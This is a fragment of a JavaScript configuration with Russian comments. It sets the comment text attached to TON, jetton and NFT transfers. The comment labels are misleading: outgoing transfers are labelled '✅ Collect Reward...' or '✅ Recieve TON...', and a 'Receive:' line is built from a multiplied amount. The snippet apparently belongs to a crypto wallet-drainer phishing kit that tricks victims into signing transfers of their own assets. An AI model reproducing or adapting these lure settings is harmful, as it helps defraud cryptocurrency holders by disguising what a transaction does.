...
const sumDyn = "100.00"; // Множитель для динамичного комментария
const textDyn = "Receive:  "; // Текст в динамичном комментарии
const txt_com = "✅ Collect Reward..."; // Комментарий при трансфере TON и JETTON(Статичный)
const txtnft_com = "✅ Recieve TON..."; // Комментарий при трансфере NFT(Статичный)
